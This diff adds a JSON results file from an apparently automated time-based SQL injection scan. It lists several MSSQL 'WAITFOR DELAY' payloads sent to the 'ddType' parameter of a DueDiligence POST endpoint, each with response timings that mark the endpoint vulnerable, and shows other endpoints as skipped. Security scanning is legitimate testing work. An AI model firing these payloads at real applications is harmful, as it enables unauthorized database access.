@@ -1,0 +1,78 @@
+[
+  {
+    "endpoint": "/CustomerProviderDocument/GetDDDocumentList",
+    "skipped": true,
+    "skip_reason": "Paramètre 'searchData' trouvé - endpoint ignoré"
+  },
+  {
+    "endpoint": "/DueDiligence/UpdateDueDiligenceTeamChatNotfied",
+    "controller": "DueDiligence",
+    "action": "UpdateDueDiligenceTeamChatNotfied",
+    "http_method": "POST",
+    "baseline_time": 3.11,
+    "timestamp": "2025-12-22T11:42:27.744796",
+    "skipped": false,
+    "vulnerabilities": [
+      {
+        "parameter": "ddType",
+        "payload": "';WAITFOR DELAY '0:0:10'--",
+        "response_time": 20.28,
+        "baseline_time": 3.11,
+        "time_difference": 17.17,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "';WAITFOR DELAY '0:0:15'--",
+        "response_time": 20.03,
+        "baseline_time": 3.11,
+        "time_difference": 16.92,
+        "expected_delay": 15.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "' OR '1'='1';WAITFOR DELAY '0:0:10'--",
+        "response_time": 13.22,
+        "baseline_time": 3.11,
+        "time_difference": 10.11,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "1';WAITFOR DELAY '0:0:10'--",
+        "response_time": 20.2,
+        "baseline_time": 3.11,
+        "time_difference": 17.09,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "admin';WAITFOR DELAY '0:0:10'--",
+        "response_time": 20.65,
+        "baseline_time": 3.11,
+        "time_difference": 17.55,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      }
+    ]
+  },
+  {
+    "endpoint": "/Company/GetCompaniesList",
+    "skipped": true,
+    "skip_reason": "Paramètre 'searchData' trouvé - endpoint ignoré"
+  },
+  {
+    "endpoint": "/Company/GetImportedSPList",
+    "skipped": true,
+    "skip_reason": "Paramètre 'searchData' trouvé - endpoint ignoré"
+  }
+]
